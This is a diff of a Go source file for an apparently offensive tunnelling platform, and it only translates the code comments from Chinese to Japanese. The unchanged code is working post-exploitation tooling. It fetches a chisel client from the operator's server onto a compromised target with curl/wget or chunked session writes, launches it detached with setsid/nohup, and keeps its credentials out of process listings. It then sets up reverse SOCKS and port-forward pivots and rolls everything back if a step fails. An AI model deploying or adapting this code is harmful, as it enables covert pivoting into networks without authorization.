@@ -1,8 +1,8 @@
-// deploy.go 是四件套之 deploy:① 平台侧起 chisel server（进程台账：pid/命令行/
-// 日志落 deploy_params);② 客户端二进制经 stage 受管投递生成一次性 URL，经会话
-// 下载到目标 /tmp 随机名并 chmod+x（目标无 curl/wget 回退会话分块写入
-// session.WriteFile);③ 远端后台拉起（输出重定向，pid 经哨兵取回）;④ 隧道内
-// 决定性验证——通才标 alive;⑤ 任一失败按 RollbackSteps 逐层回滚。
+// deploy.go は 4 点セットの deploy：① プラットフォーム側で chisel server を起動（プロセス台帳：pid/コマンドライン/
+// ログを deploy_params に保存）、② クライアントバイナリを stage の管理下配信でワンタイム URL に変換し、セッション
+// 経由でターゲットの /tmp にランダム名でダウンロードして chmod+x（ターゲットに curl/wget がなければセッションの
+// 分割書き込み session.WriteFile にフォールバック）、③ リモートでバックグラウンド起動（出力をリダイレクトし、pid は
+// センチネルで取得）、④ トンネル内での決定的検証——通って初めて alive を付ける、⑤ いずれかが失敗したら RollbackSteps に従い段階的にロールバック。
 package tunnel
 
 import (
@@ -27,53 +27,53 @@ import (
 	"github.com/Autumn-27/artex/stage"
 )
 
-// 部署时序参数。
+// デプロイのタイミングパラメータ。
 const (
-	serverUpWait   = 2 * time.Second  // server 进程秒退检测
-	callbackWait   = 25 * time.Second // 等目标回连（反向监听口起来）
+	serverUpWait   = 2 * time.Second  // server プロセスの即終了検出
+	callbackWait   = 25 * time.Second // ターゲットのコールバック待ち（リバース待受口が起きるまで）
 	dialProbeEvery = 500 * time.Millisecond
 	verifyTimeout  = 8 * time.Second
-	remoteExecWait = 120 * time.Second // 下载二进制（可能走会话分块回退）
+	remoteExecWait = 120 * time.Second // バイナリのダウンロード（セッションの分割書き込みへのフォールバックを含む）
 )
 
-// Manager 是隧道子系统的运行时：部署/验证/回滚/巡检/回收。受管资源原则——
-// 所有外部暴露面（server 进程、远端进程、stage 条目、监听端口）都经它登记与回收。
+// Manager はトンネルサブシステムのランタイム：デプロイ/検証/ロールバック/ヘルスチェック/回収。管理対象リソースの原則——
+// すべての外部露出面（server プロセス、リモートプロセス、stage エントリ、待受ポート）はこれを通して登録・回収する。
 type Manager struct {
 	store      *db.TunnelStore
 	stage      *stage.Manager
 	sessions   *session.Registry
-	chiselPath string // 空 = 二进制缺失，Deploy 返回明确错误
-	suo5Path   string // 空 = suo5 二进制缺失，suo5 适配器 Deploy 返回明确错误
-	suo5PayloadsDir string // 空 = payloads 目录缺失，同上
-	dataDir    string // 平台侧隧道工作目录（authfile/日志）
-	// OnListenStart/OnListenStop 是监听端口台账钩子（server 层注册进端口审计）。
+	chiselPath string // 空 = バイナリ欠落、Deploy は明確なエラーを返す
+	suo5Path   string // 空 = suo5 バイナリ欠落、suo5 アダプタの Deploy は明確なエラーを返す
+	suo5PayloadsDir string // 空 = payloads ディレクトリ欠落、同上
+	dataDir    string // プラットフォーム側のトンネル作業ディレクトリ（authfile/ログ）
+	// OnListenStart/OnListenStop は待受ポート台帳のフック（server 層がポート監査に登録する）。
 	OnListenStart func(port int)
 	OnListenStop  func(port int)
-	// OnStateChange 是隧道状态变化钩子（期 3b:server 层挂任务 MITM 上游热切换）。
-	// 在 alive/error/stopped 每次落定后触发,参数为归属任务 id。
+	// OnStateChange はトンネル状態変化のフック（フェーズ 3b：server 層がタスク MITM 上流のホットスイッチを登録する）。
+	// alive/error/stopped のいずれかに確定するたびに発火し、引数は所属タスクの id。
 	OnStateChange func(taskID int64)
 
-	procs map[int64]*exec.Cmd // tunnel_id → 本进程拉起的 server（进程台账内存面）
+	procs map[int64]*exec.Cmd // tunnel_id → 本プロセスが起動した server（プロセス台帳のメモリ面）
 }
 
-// Options 是 Manager 装配输入。
+// Options は Manager の組み立て入力。
 type Options struct {
 	Store      *db.TunnelStore
 	Stage      *stage.Manager
 	Sessions   *session.Registry
-	ChiselPath string // ARTEX_CHISEL_PATH 或 data/tools/chisel；不存在时 Deploy 明确报错
-	// Suo5Path 是 suo5 CLI 路径（ARTEX_SUO5_PATH 或 data/tools/suo5);
-	// Suo5PayloadsDir 是 payload 目录（ARTEX_SUO5_PAYLOADS_DIR 或 data/tools/suo5-payloads)。
-	// 缺失时仅 suo5 适配器 Deploy 报明确错误，不影响 chisel。
+	ChiselPath string // ARTEX_CHISEL_PATH または data/tools/chisel。存在しない場合、Deploy は明確にエラーを返す
+	// Suo5Path は suo5 CLI のパス（ARTEX_SUO5_PATH または data/tools/suo5）。
+	// Suo5PayloadsDir は payload ディレクトリ（ARTEX_SUO5_PAYLOADS_DIR または data/tools/suo5-payloads）。
+	// 欠落時は suo5 アダプタの Deploy だけが明確なエラーを返し、chisel には影響しない。
 	Suo5Path        string
 	Suo5PayloadsDir string
 	DataDir         string
 }
 
-// NewManager 构造运行时。chisel 存在时读 sha256 打印日志（供应链自检）。
+// NewManager はランタイムを構築する。chisel が存在すれば sha256 を読んでログ出力する（サプライチェーン自己チェック）。
 func NewManager(o Options) (*Manager, error) {
 	if o.Store == nil || o.Sessions == nil {
-		return nil, fmt.Errorf("tunnel.Manager 需要 store 与 sessions")
+		return nil, fmt.Errorf("tunnel.Manager には store と sessions が必要です")
 	}
 	dir := filepath.Join(o.DataDir, "tunnels")
 	if err := os.MkdirAll(dir, 0o700); err != nil {
@@ -87,27 +87,27 @@ func NewManager(o Options) (*Manager, error) {
 	}
 	if o.ChiselPath != "" {
 		if sum, err := fileSHA256(o.ChiselPath); err != nil {
-			log.Printf("[tunnel] chisel 二进制不可读（%s): %v —— Deploy 将报明确错误", o.ChiselPath, err)
+			log.Printf("[tunnel] chisel バイナリを読み取れません（%s）：%v — Deploy は明確なエラーを返します", o.ChiselPath, err)
 			m.chiselPath = ""
 		} else {
-			log.Printf("[tunnel] chisel 二进制： %s sha256=%s", o.ChiselPath, sum)
+			log.Printf("[tunnel] chisel バイナリ： %s sha256=%s", o.ChiselPath, sum)
 		}
 	} else {
-		log.Printf("[tunnel] 未配置 chisel 二进制（ARTEX_CHISEL_PATH 或 data/tools/chisel),tunnel_deploy 将报明确错误")
+		log.Printf("[tunnel] chisel バイナリが未設定です（ARTEX_CHISEL_PATH または data/tools/chisel）、tunnel_deploy は明確なエラーを返します")
 	}
 	if m.suo5Path != "" {
 		if sum, err := fileSHA256(m.suo5Path); err != nil {
-			log.Printf("[tunnel] suo5 二进制不可读（%s): %v —— suo5 适配器 Deploy 将报明确错误", m.suo5Path, err)
+			log.Printf("[tunnel] suo5 バイナリを読み取れません（%s）：%v — suo5 アダプタの Deploy は明確なエラーを返します", m.suo5Path, err)
 			m.suo5Path = ""
 		} else {
-			log.Printf("[tunnel] suo5 二进制： %s sha256=%s", m.suo5Path, sum)
+			log.Printf("[tunnel] suo5 バイナリ： %s sha256=%s", m.suo5Path, sum)
 		}
 	} else {
-		log.Printf("[tunnel] 未配置 suo5 二进制（ARTEX_SUO5_PATH 或 data/tools/suo5),adapter=suo5 将报明确错误")
+		log.Printf("[tunnel] suo5 バイナリが未設定です（ARTEX_SUO5_PATH または data/tools/suo5）、adapter=suo5 は明確なエラーを返します")
 	}
 	if m.suo5PayloadsDir != "" {
 		if st, err := os.Stat(m.suo5PayloadsDir); err != nil || !st.IsDir() {
-			log.Printf("[tunnel] suo5 payloads 目录不可读（%s) —— suo5 适配器 Deploy 将报明确错误", m.suo5PayloadsDir)
+			log.Printf("[tunnel] suo5 payloads ディレクトリを読み取れません（%s）— suo5 アダプタの Deploy は明確なエラーを返します", m.suo5PayloadsDir)
 			m.suo5PayloadsDir = ""
 		}
 	}
@@ -127,13 +127,13 @@ func fileSHA256(path string) (string, error) {
 	return hex.EncodeToString(h.Sum(nil)), nil
 }
 
-// ChiselPath 返回已校验的 chisel 路径（空 = 缺失）。
+// ChiselPath は検証済みの chisel パスを返す（空 = 欠落）。
 func (m *Manager) ChiselPath() string { return m.chiselPath }
 
-// Suo5Path 返回已校验的 suo5 CLI 路径（空 = 缺失）。
+// Suo5Path は検証済みの suo5 CLI パスを返す（空 = 欠落）。
 func (m *Manager) Suo5Path() string { return m.suo5Path }
 
-// CanListen 试绑平台端口（端口分配的真实检查）。
+// CanListen はプラットフォームのポートを試しにバインドする（ポート割り当ての実検査）。
 func CanListen(port int) bool {
 	ln, err := net.Listen("tcp", "0.0.0.0:"+strconv.Itoa(port))
 	if err != nil {
@@ -143,7 +143,7 @@ func CanListen(port int) bool {
 	return true
 }
 
-// UsedPorts 汇总活隧道台账占用的平台端口（listen/socks/local)。
+// UsedPorts は稼働中トンネルの台帳が占有するプラットフォームのポートを集計する（listen/socks/local）。
 func UsedPorts(recs []*db.TunnelRecord) map[int]bool {
 	used := map[int]bool{}
 	for _, r := range recs {
@@ -169,26 +169,26 @@ func (m *Manager) saveParams(ctx context.Context, id int64, p *Plan) {
 		return
 	}
 	if err := m.store.UpdateDeployParams(ctx, id, p.RemotePID, raw); err != nil {
-		log.Printf("[tunnel] 台账参数回写失败(id=%d): %v", id, err)
+		log.Printf("[tunnel] 台帳パラメータの書き戻しに失敗しました (id=%d): %v", id, err)
 	}
 }
 
-// Deploy 执行完整部署：建台账行 → 起 server → 投递客户端 → 远端拉起 →
-// 决定性验证 → 标 alive。任一失败逐层回滚（含删台账行），返回带层级的错误。
-// adapter=suo5 时分流到 deploySuo5(HTTP 隧道，无目标侧进程，覆盖无出网场景）。
+// Deploy は完全なデプロイを実行する：台帳行の作成 → server の起動 → クライアントの配信 → リモートでの起動 →
+// 決定的検証 → alive の付与。いずれかが失敗したら段階的にロールバックし（台帳行の削除を含む）、層情報付きのエラーを返す。
+// adapter=suo5 のときは deploySuo5 に分岐する（HTTP トンネル、ターゲット側プロセスなし、外向き通信のない状況をカバー）。
 func (m *Manager) Deploy(ctx context.Context, p *Plan) (*db.TunnelRecord, error) {
 	if p.Adapter == AdapterSuo5 {
 		return m.deploySuo5(ctx, p)
 	}
 	if m.chiselPath == "" {
-		return nil, fmt.Errorf("chisel 二进制缺失：把对应平台的 chisel 放到 data/tools/chisel 或设 ARTEX_CHISEL_PATH 后重试")
+		return nil, fmt.Errorf("chisel バイナリが見つかりません：対象プラットフォームの chisel を data/tools/chisel に置くか、ARTEX_CHISEL_PATH を設定して再試行してください")
 	}
 	if p.Kind == KindSocks && p.SocksPort <= 0 || p.Kind == KindPortfwd && p.LocalPort <= 0 {
-		return nil, fmt.Errorf("计划缺收入口端口（socks_port/local_port)")
+		return nil, fmt.Errorf("計画に入口ポートがありません（socks_port/local_port）")
 	}
 	sess, ok := m.sessions.Get(p.ViaSessionID)
 	if !ok {
-		return nil, fmt.Errorf("会话 %d 不在注册表，无法部署", p.ViaSessionID)
+		return nil, fmt.Errorf("セッション %d がレジストリにないため、デプロイできません", p.ViaSessionID)
 	}
 	rec := &db.TunnelRecord{
 		TaskID: p.TaskID, Kind: p.Kind, Adapter: p.Adapter,
@@ -200,42 +200,42 @@ func (m *Manager) Deploy(ctx context.Context, p *Plan) (*db.TunnelRecord, error)
 	rec.DeployParams = raw
 	id, err := m.store.Create(ctx, rec)
 	if err != nil {
-		return nil, fmt.Errorf("台账落库失败: %w", err)
+		return nil, fmt.Errorf("台帳の永続化に失敗しました: %w", err)
 	}
 	if err := m.deployInto(ctx, id, sess, p); err != nil {
 		m.rollback(ctx, id, sess, p)
 		return nil, err
 	}
 	if err := m.store.UpdateState(ctx, id, db.TunnelAlive, ""); err != nil {
-		log.Printf("[tunnel] 状态回写失败(id=%d): %v", id, err)
+		log.Printf("[tunnel] 状態の書き戻しに失敗しました (id=%d): %v", id, err)
 	}
 	m.notifyState(p.TaskID)
 	rec, _ = m.store.Get(ctx, id)
 	return rec, nil
 }
 
-// notifyState 触发状态变化钩子（server 层据此热切换任务 MITM 上游）。
+// notifyState は状態変化フックを発火する（server 層はこれでタスク MITM 上流をホットスイッチする）。
 func (m *Manager) notifyState(taskID int64) {
 	if m.OnStateChange != nil && taskID > 0 {
 		m.OnStateChange(taskID)
 	}
 }
 
-// deployInto 按层推进，每层成功即把台账参数落库（进程台账逐层补齐）。
+// deployInto は層ごとに進め、各層の成功時点で台帳パラメータを永続化する（プロセス台帳を層ごとに埋める）。
 func (m *Manager) deployInto(ctx context.Context, id int64, sess session.Session, p *Plan) error {
-	// 层 1：平台侧 chisel server(authfile 0600,auth 不进命令行）。
+	// 層 1：プラットフォーム側 chisel server（authfile 0600、auth はコマンドラインに載せない）。
 	if err := os.WriteFile(p.AuthFile, []byte(p.AuthfileContent()), 0o600); err != nil {
-		return fmt.Errorf("层 server_process: authfile 写入失败: %w", err)
+		return fmt.Errorf("層 server_process: authfile の書き込みに失敗しました: %w", err)
 	}
 	logFile, err := os.OpenFile(p.ServerLog, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
 	if err != nil {
-		return fmt.Errorf("层 server_process: 日志打开失败: %w", err)
+		return fmt.Errorf("層 server_process: ログのオープンに失敗しました: %w", err)
 	}
 	cmd := exec.Command(m.chiselPath, p.ServerArgs...)
 	cmd.Stdout, cmd.Stderr = logFile, logFile
 	if err := cmd.Start(); err != nil {
 		_ = logFile.Close()
-		return fmt.Errorf("层 server_process: 启动失败: %w", err)
+		return fmt.Errorf("層 server_process: 起動に失敗しました: %w", err)
 	}
 	p.ServerPID = cmd.Process.Pid
 	m.procs[id] = cmd
@@ -244,46 +244,46 @@ func (m *Manager) deployInto(ctx context.Context, id int64, sess session.Session
 		m.OnListenStart(p.ListenPort)
 	}
 	go func() { _ = cmd.Wait(); _ = logFile.Close() }()
-	time.Sleep(serverUpWait) // 秒退检测
+	time.Sleep(serverUpWait) // 即終了の検出
 	if cmd.ProcessState != nil && cmd.ProcessState.Exited() {
-		return fmt.Errorf("层 server_process: chisel server 秒退（日志 %s)", p.ServerLog)
+		return fmt.Errorf("層 server_process: chisel server が即終了しました（ログ %s）", p.ServerLog)
 	}
 
-	// 层 2：客户端二进制受管投递（stage 一次性 URL;curl → wget → 会话分块写入）。
+	// 層 2：クライアントバイナリの管理下配信（stage のワンタイム URL、curl → wget → セッションの分割書き込み）。
 	if err := m.deliver(ctx, sess, p); err != nil {
-		return fmt.Errorf("层 stage_entry: %w", err)
+		return fmt.Errorf("層 stage_entry: %w", err)
 	}
 	m.saveParams(ctx, id, p)
 
-	// 层 3：远端后台拉起（AUTH 走环境变量，不进 ps cmdline;setsid+nohup 脱离会话）。
+	// 層 3：リモートでバックグラウンド起動（AUTH は環境変数で渡して ps cmdline に出さない、setsid+nohup でセッションから切り離す）。
 	pid, err := m.spawnRemote(ctx, sess, p)
 	if err != nil {
-		return fmt.Errorf("层 remote_process: %w", err)
+		return fmt.Errorf("層 remote_process: %w", err)
 	}
 	p.RemotePID = pid
 	m.saveParams(ctx, id, p)
 
-	// 层 4：隧道内决定性验证。反向监听口 accept ≠ 目标可达，必须真实拨测。
+	// 層 4：トンネル内での決定的検証。リバース待受口の accept ≠ ターゲット到達性なので、実際に接続テストする必要がある。
 	if err := m.verify(ctx, sess, p); err != nil {
-		return fmt.Errorf("层 verify: %w", err)
+		return fmt.Errorf("層 verify: %w", err)
 	}
 	return nil
 }
 
-// deliver 经 stage 投递客户端二进制到目标 RemoteBin 并 chmod+x。
+// deliver は stage 経由でクライアントバイナリをターゲットの RemoteBin に配信し、chmod+x する。
 func (m *Manager) deliver(ctx context.Context, sess session.Session, p *Plan) error {
 	if m.stage == nil {
-		return fmt.Errorf("stage 暂存服务未启用，无法投递")
+		return fmt.Errorf("stage 一時保管サービスが有効になっていないため、配信できません")
 	}
 	entry, err := m.stage.PutFile(m.chiselPath, stage.PutOpts{
 		OneShot: true, TaskID: strconv.FormatInt(p.TaskID, 10),
 	})
 	if err != nil {
-		return fmt.Errorf("stage 投递失败: %w", err)
+		return fmt.Errorf("stage の配信に失敗しました: %w", err)
 	}
 	p.StageToken = entry.Token
-	// stage URL 主机是平台主监听地址（0.0.0.0 时还是回环占位），目标未必可达；
-	// 换成 callback host（目标回连平台用的地址），端口保留主监听口。
+	// stage URL のホストはプラットフォームのメイン待受アドレス（0.0.0.0 のときはループバックのプレースホルダ）で、ターゲットから到達できるとは限らない；
+	// callback host（ターゲットがプラットフォームへコールバックする際のアドレス）に置き換え、ポートはメイン待受口を保持する。
 	dlURL := rewriteURLHost(entry.URL, p.PlatformAddr)
 	dl := fmt.Sprintf(`mkdir -p %s && (curl -fsSL -m 90 '%s' -o %s 2>/dev/null || wget -q -T 90 -O %s '%s' 2>/dev/null) && echo ARTEX_DL_OK || echo ARTEX_DL_FAIL`,
 		p.RemoteDir, dlURL, p.RemoteBin, p.RemoteBin, dlURL)
@@ -291,23 +291,23 @@ func (m *Manager) deliver(ctx context.Context, sess session.Session, p *Plan) er
 	if err == nil && strings.Contains(stdout, "ARTEX_DL_OK") {
 		return m.chmodRemote(ctx, sess, p)
 	}
-	// 回退：目标无 curl/wget（或被拦）——经会话分块写入（session.WriteFile 内部分块）。
-	log.Printf("[tunnel] 目标直接下载失败，回退会话分块写入（%s)…", p.RemoteDir)
+	// フォールバック：ターゲットに curl/wget がない（またはブロックされた）——セッションの分割書き込みを使う（session.WriteFile が内部で分割する）。
+	log.Printf("[tunnel] ターゲットでの直接ダウンロードに失敗し、セッションの分割書き込みにフォールバックします（%s）…", p.RemoteDir)
 	data, rerr := os.ReadFile(m.chiselPath)
 	if rerr != nil {
-		return fmt.Errorf("读取本地 chisel 失败: %w", rerr)
+		return fmt.Errorf("ローカルの chisel の読み込みに失敗しました: %w", rerr)
 	}
 	if _, _, err := sess.Exec(ctx, "mkdir -p "+p.RemoteDir, probeTimeout); err != nil {
-		return fmt.Errorf("远端目录创建失败: %w", err)
+		return fmt.Errorf("リモートディレクトリの作成に失敗しました: %w", err)
 	}
 	if err := sess.WriteFile(ctx, p.RemoteBin, data); err != nil {
-		return fmt.Errorf("会话分块写入失败: %w", err)
+		return fmt.Errorf("セッションの分割書き込みに失敗しました: %w", err)
 	}
 	return m.chmodRemote(ctx, sess, p)
 }
 
-// rewriteURLHost 把 stage URL 的主机名替换为 callback host（端口保留）。
-// 解析失败时原样返回（诚实降级，目标下载失败还有会话分块写入兜底）。纯函数。
+// rewriteURLHost は stage URL のホスト名を callback host に置き換える（ポートは保持）。
+// 解析に失敗したらそのまま返す（正直に縮退し、ダウンロード失敗時はセッションの分割書き込みが受け皿になる）。純粋関数。
 func rewriteURLHost(rawURL, platformAddr string) string {
 	cbHost, _, err := net.SplitHostPort(platformAddr)
 	if err != nil || cbHost == "" {
@@ -329,43 +329,43 @@ func rewriteURLHost(rawURL, platformAddr string) string {
 func (m *Manager) chmodRemote(ctx context.Context, sess session.Session, p *Plan) error {
 	stdout, _, err := sess.Exec(ctx, fmt.Sprintf("chmod +x %s && echo ARTEX_CHMOD_OK || echo ARTEX_CHMOD_FAIL", p.RemoteBin), probeTimeout)
 	if err != nil {
-		return fmt.Errorf("chmod 执行失败: %w", err)
+		return fmt.Errorf("chmod の実行に失敗しました: %w", err)
 	}
 	if !strings.Contains(stdout, "ARTEX_CHMOD_OK") {
-		return fmt.Errorf("chmod 失败（目标可能 noexec 挂载 /tmp): %s", detailOf(stdout))
+		return fmt.Errorf("chmod に失敗しました（ターゲットの /tmp が noexec マウントの可能性）: %s", detailOf(stdout))
 	}
 	return nil
 }
 
-// spawnRemote 远端后台拉起 client，经哨兵取回真实 pid。
+// spawnRemote はリモートで client をバックグラウンド起動し、センチネルで実際の pid を取得する。
 func (m *Manager) spawnRemote(ctx context.Context, sess session.Session, p *Plan) (int, error) {
-	// AUTH 经 env 注入（chisel client 在 --auth 缺省时读 AUTH env)——auth 不出现在
-	// 目标机 ps cmdline;取舍：/proc/<pid>/environ 对同 uid 仍可见，目标已是立足点，可接受。
+	// AUTH は env で注入する（chisel client は --auth 未指定時に AUTH env を読む）——auth は
+	// ターゲット機の ps cmdline に出ない。トレードオフとして、/proc/<pid>/environ は同一 uid から見えるが、ターゲットは既にフットホールドなので許容する。
 	spawn := fmt.Sprintf(`cd %s && setsid env AUTH='%s:%s' nohup ./ch %s > %s 2>&1 < /dev/null & echo ARTEX_PID=$!`,
 		p.RemoteDir, p.AuthUser, p.AuthPass, strings.Join(p.ClientArgs, " "), p.RemoteLog)
 	stdout, _, err := sess.Exec(ctx, spawn, probeTimeout)
 	if err != nil {
-		return 0, fmt.Errorf("拉起命令失败: %w", err)
+		return 0, fmt.Errorf("起動コマンドに失敗しました: %w", err)
 	}
 	_, after, found := strings.Cut(stdout, "ARTEX_PID=")
 	if !found {
-		return 0, fmt.Errorf("未取到远端 pid（哨兵缺失）: %s", detailOf(stdout))
+		return 0, fmt.Errorf("リモート pid を取得できませんでした（センチネル欠落）: %s", detailOf(stdout))
 	}
 	pidStr := strings.Fields(after)
 	if len(pidStr) == 0 {
-		return 0, fmt.Errorf("远端 pid 解析失败： %s", detailOf(stdout))
+		return 0, fmt.Errorf("リモート pid の解析に失敗しました： %s", detailOf(stdout))
 	}
 	pid, err := strconv.Atoi(strings.TrimSpace(pidStr[0]))
 	if err != nil || pid <= 0 {
-		return 0, fmt.Errorf("远端 pid 非法 %q", pidStr[0])
+		return 0, fmt.Errorf("リモート pid が不正です %q", pidStr[0])
 	}
 	return pid, nil
 }
 
-// verify 等回连入口起来后做决定性验证。
+// verify はコールバック入口が起きてから決定的検証を行う。
 func (m *Manager) verify(ctx context.Context, sess session.Session, p *Plan) error {
 	entry := m.entryAddr(p)
-	// 等反向入口监听起来（= 目标已回连）。
+	// リバース入口が待受を開始するまで待つ（= ターゲットがコールバック済み）。
 	deadline := time.Now().Add(callbackWait)
 	up := false
 	for time.Now().Before(deadline) {
@@ -382,15 +382,15 @@ func (m *Manager) verify(ctx context.Context, sess session.Session, p *Plan) err
 		}
 	}
 	if !up {
-		return fmt.Errorf("等待回连超时（%v 内 %s 未起监听；可能出网被拦/端口白名单，先 tunnel_probe 复核）", callbackWait, entry)
+		return fmt.Errorf("コールバックがタイムアウトしました（%v 以内に %s が待受を開始せず。外向き通信がブロックされている、またはポート許可リストの可能性があるため、先に tunnel_probe で再確認してください）", callbackWait, entry)
 	}
 	switch p.Kind {
 	case KindSocks:
-		// 验证目标候选按序尝试,任一通过即算隧道通:
-		// 1) 显式 verify_addr(默认=立足点 webshell 地址,但经 NAT/端口映射时
-		//    该地址对目标侧无意义——实战:host:8082 映射到容器:8080,容器回环无 8082);
-		// 2) 隧道自环 callbackHost:listenPort(chisel server 自身,client 已连上
-		//    故目标侧必可达)——经 socks 拨回服务端即证明隧道双向承载,无 NAT 假设。
+		// 検証対象の候補を順に試し、いずれかが通ればトンネルは通ったとみなす：
+		// 1) 明示的な verify_addr（デフォルト = フットホールド webshell のアドレス。ただし NAT/ポートマッピングを経る場合
+		//    このアドレスはターゲット側では意味を持たない——実例：host:8082 がコンテナ：8080 にマッピングされ、コンテナのループバックに 8082 はない）、
+		// 2) トンネル自身へのループバック callbackHost:listenPort（chisel server 自身。client は既に接続済み
+		//    なのでターゲット側から必ず到達できる）——socks 経由でサーバー側へ接続して戻ってくれば、トンネルが双方向に通信を運べることの証明になり、NAT の仮定を置かずに済む。
 		cands := []string{}
 		if p.VerifyAddr != "" {
 			cands = append(cands, p.VerifyAddr)
@@ -403,7 +403,7 @@ func (m *Manager) verify(ctx context.Context, sess session.Session, p *Plan) err
 			}
 			if err := socks5Dial(entry, addr, verifyTimeout); err == nil {
 				if addr == p.PlatformAddr {
-					log.Printf("[tunnel] socks 经自环 %s 验证通过(隧道双向承载确认)", addr)
+					log.Printf("[tunnel] socks はループバック %s 経由の検証に通りました（トンネルが双方向に通信を運べることを確認）", addr)
 				}
 				return nil
 			} else {
@@ -411,30 +411,30 @@ func (m *Manager) verify(ctx context.Context, sess session.Session, p *Plan) err
 			}
 		}
 		if lastErr != nil {
-			return fmt.Errorf("经 socks5 拨测全部候选失败（入口起≠隧道通）: %w", lastErr)
+			return fmt.Errorf("socks5 経由の接続テストがすべての候補で失敗しました（入口が起きた ≠ トンネルが通る）: %w", lastErr)
 		}
-		log.Printf("[tunnel] socks 入口已起，但未给 verify_addr，决定性验证降级为「入口可连」")
+		log.Printf("[tunnel] socks 入口は起きましたが verify_addr が未指定のため、決定的検証は「入口に接続可能」に降格します")
 		return nil
 	case KindPortfwd:
-		// 预检：目标侧真实可达 target:port（反向监听对失败拨号也会 accept，不能只信入口）。
+		// 事前チェック：ターゲット側から target:port に実際に到達できるか（リバース待受は失敗した接続でも accept するため、入口だけを信じてはいけない）。
 		pre := fmt.Sprintf(`bash -c 'timeout 5 bash -c "</dev/tcp/%s/%d"' 2>/dev/null && echo ARTEX_PRE_OK || echo ARTEX_PRE_FAIL`,
 			p.TargetHost, p.TargetPort)
 		stdout, _, err := sess.Exec(ctx, pre, probeTimeout)
 		if err != nil || !strings.Contains(stdout, "ARTEX_PRE_OK") {
-			return fmt.Errorf("目标侧预检 %s:%d 不可达（从立足点实测）: %s", p.TargetHost, p.TargetPort, detailOf(stdout))
+			return fmt.Errorf("ターゲット側の事前チェックで %s:%d に到達できません（フットホールドからの実測）: %s", p.TargetHost, p.TargetPort, detailOf(stdout))
 		}
 		conn, err := net.DialTimeout("tcp", entry, verifyTimeout)
 		if err != nil {
-			return fmt.Errorf("经隧道访问 %s 失败： %w", entry, err)
+			return fmt.Errorf("トンネル経由の %s へのアクセスに失敗しました： %w", entry, err)
 		}
 		_ = conn.SetDeadline(time.Now().Add(3 * time.Second))
-		_, _ = conn.Write([]byte("\r\n")) // 轻探：部分服务收到任意字节即回 banner/错误，证明双向通
+		_, _ = conn.Write([]byte("\r\n")) // 軽いプローブ：一部のサービスは任意のバイトを受けると banner/エラーを返すため、双方向の疎通を証明できる
 		_ = conn.Close()
 	}
 	return nil
 }
 
-// entryAddr 是平台回环上的隧道入口（socks5 或转发口）。
+// entryAddr はプラットフォームのループバック上のトンネル入口（socks5 または転送口）。
 func (m *Manager) entryAddr(p *Plan) string {
 	port := p.SocksPort
 	if p.Kind == KindPortfwd {
@@ -443,13 +443,13 @@ func (m *Manager) entryAddr(p *Plan) string {
 	return net.JoinHostPort("127.0.0.1", strconv.Itoa(port))
 }
 
-// EntryAddr 对外暴露入口地址（工具返回 socks_addr/forward_addr 用）。
+// EntryAddr は入口アドレスを外部に公開する（ツールが socks_addr/forward_addr を返すため）。
 func (m *Manager) EntryAddr(p *Plan) string { return m.entryAddr(p) }
 
-// PlanDataDir 是平台侧隧道工作目录（PlanOpts.DataDir 用它）。
+// PlanDataDir はプラットフォーム側のトンネル作業ディレクトリ（PlanOpts.DataDir で使う）。
 func (m *Manager) PlanDataDir() string { return m.dataDir }
 
-// OccupiedPorts 汇总未终结隧道占用的平台端口（端口分配用）。
+// OccupiedPorts は未終了のトンネルが占有するプラットフォームのポートを集計する（ポート割り当て用）。
 func (m *Manager) OccupiedPorts(ctx context.Context) (map[int]bool, error) {
 	recs, err := m.store.ListActive(ctx)
 	if err != nil {
@@ -458,19 +458,19 @@ func (m *Manager) OccupiedPorts(ctx context.Context) (map[int]bool, error) {
 	return UsedPorts(recs), nil
 }
 
-// ActiveRecords 返回全部未终结（deploying|alive|error）台账行。
+// ActiveRecords は未終了（deploying|alive|error）の台帳行をすべて返す。
 func (m *Manager) ActiveRecords(ctx context.Context) ([]*db.TunnelRecord, error) {
 	return m.store.ListActive(ctx)
 }
 
-// TaskRecords 返回某任务的全部台账行。
+// TaskRecords はあるタスクの台帳行をすべて返す。
 func (m *Manager) TaskRecords(ctx context.Context, taskID int64) ([]*db.TunnelRecord, error) {
 	return m.store.ListByTask(ctx, taskID)
 }
 
-// rollback 按 RollbackSteps 逐层回滚（best-effort，每层失败只记日志继续收）。
+// rollback は RollbackSteps に従って段階的にロールバックする（best-effort。各層の失敗はログに記録して続行する）。
 func (m *Manager) rollback(ctx context.Context, id int64, sess session.Session, p *Plan) {
-	log.Printf("[tunnel] 部署失败逐层回滚(id=%d)", id)
+	log.Printf("[tunnel] デプロイ失敗のため段階的にロールバックします (id=%d)", id)
 	if p.RemotePID > 0 {
 		m.killRemote(ctx, sess, p)
 	}
@@ -485,26 +485,26 @@ func (m *Manager) rollback(ctx context.Context, id int64, sess session.Session, 
 		_ = os.Remove(p.AuthFile)
 	}
 	if err := m.store.Delete(ctx, id); err != nil {
-		log.Printf("[tunnel] 台账行删除失败(id=%d): %v", id, err)
+		log.Printf("[tunnel] 台帳行の削除に失敗しました (id=%d): %v", id, err)
 	}
 }
 
-// killRemote 经会话杀目标侧进程：先 kill -0 并核对 /proc/<pid>/cmdline 含远端
-// 二进制路径——查【远端】，且防 pid 复用误杀（PivotHub 查本机的缺陷在此修正）。
+// killRemote はセッション経由でターゲット側のプロセスを停止する：まず kill -0 と /proc/<pid>/cmdline 内のリモート
+// バイナリパスの照合を行い、【リモート】を確認し、pid 再利用による誤停止を防ぐ（PivotHub が自機を確認していた欠陥をここで修正）。
 func (m *Manager) killRemote(ctx context.Context, sess session.Session, p *Plan) {
 	chk := fmt.Sprintf(`kill -0 %d 2>/dev/null && tr '\0' ' ' < /proc/%d/cmdline 2>/dev/null || echo ARTEX_NO_PROC`, p.RemotePID, p.RemotePID)
 	stdout, _, err := sess.Exec(ctx, chk, probeTimeout)
 	if err != nil || strings.Contains(stdout, "ARTEX_NO_PROC") {
-		return // 远端已不在，无需杀
+		return // リモートに既に存在しないため、停止不要
 	}
 	if !strings.Contains(stdout, p.RemoteBin) && !strings.Contains(stdout, "/ch ") {
-		log.Printf("[tunnel] 远端 pid %d 命令行不含 %s（pid 可能复用），跳过 kill: %s", p.RemotePID, p.RemoteBin, detailOf(stdout))
+		log.Printf("[tunnel] リモート pid %d のコマンドラインに %s が含まれないため（pid 再利用の可能性）、kill をスキップします: %s", p.RemotePID, p.RemoteBin, detailOf(stdout))
 		return
 	}
